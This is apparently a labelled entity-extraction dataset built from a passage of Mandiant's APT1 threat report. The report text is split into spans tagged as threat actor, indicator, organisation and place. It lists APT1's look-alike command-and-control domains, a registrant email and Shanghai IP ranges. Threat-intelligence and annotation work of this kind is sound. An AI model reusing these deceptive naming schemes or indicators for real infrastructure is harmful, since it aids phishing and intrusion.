DocName,text,intent
Mandiant_APT1_Report,from 2004 until present,timestamp
Mandiant_APT1_Report,", in which some registrants tried to fabricate non-",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," locations but others did not. This is supported by 
contextual information on the Internet for the email address “",O
Mandiant_APT1_Report,lfengg@163.com,ioc
Mandiant_APT1_Report,",” which was supplied in the registration 
information for seven of the 107 zones. On the site “www.",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,"-one.org,” the email address “",O
Mandiant_APT1_Report,lfengg@163.com,ioc
Mandiant_APT1_Report,"” 
appears as the contact for the ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,"Kai Optical Information Technology Co., Ltd.",org
Mandiant_APT1_Report,", a website production company 
located in a part of ",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report, that is across the river from ,O
Mandiant_APT1_Report,PLA Unit 61398,threat_actor
Mandiant_APT1_Report,". 

FIGure 25: an email address used to register ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, zones is also a contact for a ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," company



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 48 www.mandiant.com

naming themes
About half of ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s known zones were named according to three themes: news, technology and business. These 
themes cause ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," command and control addresses to appear benign at first glance. However, we believe that the 
hundreds of FQDNs within these zones were created for the purpose of ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," intrusions. (Note: these themes are not 
unique to ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, or even ,O
Mandiant_APT1_Report,APT,threat_actor
Mandiant_APT1_Report," in general.) 

The news-themed zones include the names of well-known news media outlets such as ",O
Mandiant_APT1_Report,CNN,org
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,Yahoo,org
Mandiant_APT1_Report, and ,O
Mandiant_APT1_Report,Reuters,org
Mandiant_APT1_Report,". 
However, they also include names referencing English-speaking countries, such as “",O
Mandiant_APT1_Report,aunewsonline.com,ioc
Mandiant_APT1_Report,” (,O
Mandiant_APT1_Report,Australia,country
Mandiant_APT1_Report,"), 
“",O
Mandiant_APT1_Report,Canadatvsite.com,ioc
Mandiant_APT1_Report,” (,O
Mandiant_APT1_Report,Canada,country
Mandiant_APT1_Report,"), and “",O
Mandiant_APT1_Report,todayusa.org,ioc
Mandiant_APT1_Report,” (,O
Mandiant_APT1_Report,U.S.,country
Mandiant_APT1_Report,). Below is a list of zones registered by ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," that are news-
themed:

",O
Mandiant_APT1_Report,aoldaily.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,aunewsonline.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,Canadatvsite.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,canoedaily.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,cnndaily.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,cnndaily.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,cnnnewsdaily.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,defenceonline.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,freshreaders.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,giftnews.org,ioc
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,issnbgkit.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,mediaxsds.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,myyahoonews.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,newsesport.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,newsonet.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,newsonlinesite.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,newspappers.org,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,nytimesnews.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,oplaymagzine.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,phoenixtvus.com,ioc
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,purpledaily.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,reutersnewsonline.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,rssadvanced.org,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,saltlakenews.org,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,sportreadok.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,todayusa.org,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,usapappers.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,usnewssite.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,yahoodaily.com,ioc
Mandiant_APT1_Report,"

The technology-themed zones reference well-known technology companies (",O
Mandiant_APT1_Report,AOL,org
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,Apple,org
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,Google,org
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,Microsoft,org
Mandiant_APT1_Report,"), antivirus 
vendors (",O
Mandiant_APT1_Report,McAfee,org
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,Symantec,org
Mandiant_APT1_Report,"), and products (",O
Mandiant_APT1_Report,Blackberry,org
Mandiant_APT1_Report,", ",O
Mandiant_APT1_Report,Bluecoat,org
Mandiant_APT1_Report,). ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," also used more generic names referencing 
topics like software:

",O
Mandiant_APT1_Report,aolon1ine.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,applesoftupdate.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,blackberrycluter.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,bluecoate.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,comrepair.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,dnsweb.org,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,downloadsite.me,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,firefoxupdata.com,ioc
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,globalowa.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,gmailboxes.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,hugesoft.org,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,idirectech.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,ifexcel.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,infosupports.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,livemymsn.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,mcafeepaying.com,ioc
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,microsoft-update-info.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,micyuisyahooapis.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,msnhome.org,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,pcclubddk.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,progammerli.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,softsolutionbox.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,symanteconline.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,webservicesupdate.com,ioc
Mandiant_APT1_Report,"

Finally, some zones used by ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," reflect a business theme. The names suggest websites that professionals might visit:

",O
Mandiant_APT1_Report,advanbusiness.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,businessconsults.net,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,businessformars.com,ioc
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,companyinfosite.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,conferencesinfo.com,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,copporationnews.com,ioc
Mandiant_APT1_Report,"

",O
Mandiant_APT1_Report,infobusinessus.org,ioc
Mandiant_APT1_Report,"
",O
Mandiant_APT1_Report,jobsadvanced.com,ioc
Mandiant_APT1_Report,"

Not every zone stays within ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s control forever. Over a campaign lasting for so many years, ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," has not always 
renewed every zone in their attack infrastructure. Additionally, while some have simply been allowed to expire, 
others have been transferred to the organizations that the domain names attempted to imitate. For example, ",O
Mandiant_APT1_Report,in September 2011,timestamp
Mandiant_APT1_Report,", Yahoo filed a complaint against “",O
Mandiant_APT1_Report,zheng youjun,identity
Mandiant_APT1_Report,"” of “Arizona, ",O
Mandiant_APT1_Report,USA,country
Mandiant_APT1_Report,"”, who registered the ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 
zone “",O
Mandiant_APT1_Report,myyahoonews.com,ioc
Mandiant_APT1_Report,”.37 ,O
Mandiant_APT1_Report,Yahoo,org
Mandiant_APT1_Report, alleged the “,O
Mandiant_APT1_Report,<,O
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,myyahoonews.com,ioc
Mandiant_APT1_Report," > domain name was confusingly similar to 
Complainant’s ",O
Mandiant_APT1_Report,YAHOO!,org
Mandiant_APT1_Report, mark” and that “[,O
Mandiant_APT1_Report,zheng youjun,identity
Mandiant_APT1_Report,] registered and used the ,O
Mandiant_APT1_Report,<,O
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,myyahoonews.com,ioc
Mandiant_APT1_Report," > domain name 
in bad faith.” In response, the National Arbitration Forum found that the site “",O
Mandiant_APT1_Report,myyahoonews.com,ioc
Mandiant_APT1_Report,"” at the time resolved 

37  ",O
Mandiant_APT1_Report,Yahoo! Inc.,org
Mandiant_APT1_Report," v. Zheng National Arbitration Forum Claim Number: FA1109001409001, (",O
Mandiant_APT1_Report,"October 31, 2011",timestamp
Mandiant_APT1_Report,) (T,O
Mandiant_APT1_Report,"yrus R. Atkinson, Jr.",identity
Mandiant_APT1_Report,", panelist), http://
domains.adrforum.com/domains/decisions/1409001.htm, accessed ",O
Mandiant_APT1_Report,"February 6, 2013",timestamp
Mandiant_APT1_Report,".



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 49 www.mandiant.com

to “a phishing web page, substantially similar to the actual WorldSID website...in an effort to collect login credentials 
under false pretenses.” Not surprisingly, “",O
Mandiant_APT1_Report,zheng youjun,identity
Mandiant_APT1_Report,"” did not respond. Subsequently, control of “",O
Mandiant_APT1_Report,myyahoonews.com,ioc
Mandiant_APT1_Report,” was transferred from ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, to ,O
Mandiant_APT1_Report,Yahoo,org
Mandiant_APT1_Report,".

third-Party services
The third-party service that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," has used the most is known as “dynamic DNS.” This is a service that allows people 
to register subdomains under zones that other people have registered and provided to the service. Over the years, 
",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," has registered hundreds of FQDNs in this manner. When they need to change the IP resolution of an FQDN, they 
simply log in to these services and update the IP resolution of their FQDN via a web-based interface.

In addition to dynamic DNS, recently we have observed that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," has been creating FQDNs that end with  
“",O
Mandiant_APT1_Report,appspot.com,ioc
Mandiant_APT1_Report,"”, suggesting that they are using ",O
Mandiant_APT1_Report,Google’s App Engine,software
Mandiant_APT1_Report," service.

hijacked FQDns
",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," intruders often use the FQDNs that are associated with legitimate websites hosted by their hop points. We 
consider these domains to be “hijacked” because they were registered by someone for a legitimate reason, but have 
been leveraged by ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, for malicious purposes. ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," uses hijacked FQDNs for two main purposes. First, they 
place malware (usually in ZIP files) on the legitimate websites hosted on the hop point and then send spear phishing 
emails with a link that includes the legitimate FQDN. Second, they embed hijacked FQDNs as C2 addresses in their 
backdoors. 

EVIDENCE OF A VAST INFRASTRUCTURE

As noted above, we have confirmed the existence of 937 servers (listening applications) hosted on 849 distinct IP 
addresses, with the majority of IP addresses registered to organizations in ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report," (709), followed by the ",O
Mandiant_APT1_Report,U.S.,country
Mandiant_APT1_Report," (109). 
In the last three years we have observed ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," FQDNs resolving to 988 unique IP addresses that we believe are not 
“sinkhole”38 or “domain parking”39 IP addresses:

»» ",O
Mandiant_APT1_Report,United States,country
Mandiant_APT1_Report,": 559

»» ",O
Mandiant_APT1_Report,China,country
Mandiant_APT1_Report,": 263

»» ",O
Mandiant_APT1_Report,Taiwan,country
Mandiant_APT1_Report,": 25

»» ",O
Mandiant_APT1_Report,Korea,country
Mandiant_APT1_Report,": 22

»» ",O
Mandiant_APT1_Report,United Kingdom,country
Mandiant_APT1_Report,": 14

»» ",O
Mandiant_APT1_Report,Canada,country
Mandiant_APT1_Report,": 12

»» Other: 83

38  A sinkhole is a server that accepts redirected connections for known malicious domains. Attempted connections to C2 FQDNs are redirected to 
sinkholes once malicious zones are re-registered by research organizations or security companies in coordination with registration companies.
39  Some IP addresses are used for “domain parking” once the original registrant loses control of a zone or otherwise-registered FQDN, e.g., when 
the zone expires. These IP addresses usually host advertisements.



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 50 www.mandiant.com

The vast majority of the Chinese IP addresses again belong to ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s home networks, meaning that in some instances 
",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, intruders probably communicated directly to victim systems from their ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," systems, bypassing their hop 
infrastructure:

taBLe 11: ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," FQDns have resolved to IP addresses within these Chinese net blocks 

number net block registered owner

150 ",O
Mandiant_APT1_Report,223.166.0.0 - 223.167.255.255,ioc
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,China Unicom,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," Network 

68 ",O
Mandiant_APT1_Report,58.246.0.0 - 58.247.255.255,ioc
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,China Unicom,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," Network 

10 ",O
Mandiant_APT1_Report,112.64.0.0 - 112.65.255.255,ioc
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,China Unicom,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," Network 

7 ",O
Mandiant_APT1_Report,114.80.0.0 - 114.95.255.255,ioc
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,China Telecom,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," Network

5 ",O
Mandiant_APT1_Report,139.226.0.0 - 139.227.255.255,ioc
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,China Unicom,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," Network 

4 ",O
Mandiant_APT1_Report,222.64.0.0 - 222.73.255.25,ioc
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,China Telecom,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," Network

3 ",O
Mandiant_APT1_Report,116.224.0.0 – 116.239.255.255,ioc
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,China Telecom,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report," Network

16 Other (Non-",O
Mandiant_APT1_Report,Shanghai,city
Mandiant_APT1_Report,")

These statistics indicate that there are over 400 IP addresses in the ",O
Mandiant_APT1_Report,U.S.,country
Mandiant_APT1_Report, alone that may have active ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," servers, 
which are as-yet unconfirmed by ",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report,". Additionally, although we know of over 2,500 ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," FQDNs, there are 
many ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report, FQDNs that we have not attributed to ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,", which have resolved to even more IP addresses. We estimate 
(conservatively) that ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s current hop infrastructure includes over 1,000 servers. 



",O
Mandiant_APT1_Report,Mandiant,org
Mandiant_APT1_Report, ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," 51 www.mandiant.com

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,": IDentItIes

",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," is not a ghost in a digital machine. In our effort to underscore that there are actual individuals tasked by the 
",O
Mandiant_APT1_Report,PLA,org
Mandiant_APT1_Report, behind ,O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report,"’s keyboards, we have decided to expose the identities of a select number of ",O
Mandiant_APT1_Report,APT1,threat_actor
Mandiant_APT1_Report," personas. These 
actors have made poor operational security choices, facilitating our research and allowing us to track their activities. 
They are some of the authors of ",O
